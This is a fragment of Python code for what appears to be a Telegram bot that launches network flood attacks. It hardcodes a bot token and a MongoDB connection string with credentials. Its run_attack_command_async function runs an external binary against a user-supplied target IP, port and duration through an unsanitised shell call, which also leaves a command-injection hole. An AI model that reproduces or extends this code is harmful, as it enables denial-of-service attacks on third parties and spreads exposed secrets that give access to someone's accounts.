...
TOKEN = '7030746706:AAGrUAFjM7W-p8sq-0JFjBEQqO7k86cm-ps'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -7452239135
CHANNEL_ID = -7452239135
error_channel_id = -7452239135
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./kaliaytjii {target_ip} {target_port} {duration} 100")
